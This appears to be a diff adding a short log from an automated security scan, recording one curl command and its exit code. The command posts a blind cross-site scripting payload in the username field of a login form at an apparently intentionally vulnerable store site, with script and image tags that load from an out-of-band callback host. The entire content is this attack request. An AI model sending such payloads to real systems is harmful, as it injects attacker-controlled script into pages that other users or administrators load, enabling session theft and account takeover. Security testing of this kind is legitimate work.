@@ -1,0 +1,4 @@
+# command: timeout 20 curl -s -m 18 -o /dev/null -X POST -d 'username="><script src=http://oob637d4e510931.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/x.js></script><img src=http://oob637d4e510931.datf6t0hgqag02gk65agnaytj47t1eyph.oast.abhedi.co.in/i>' https://duck-store.escape.tech/login
+# exit_code: 0
+# ---
+
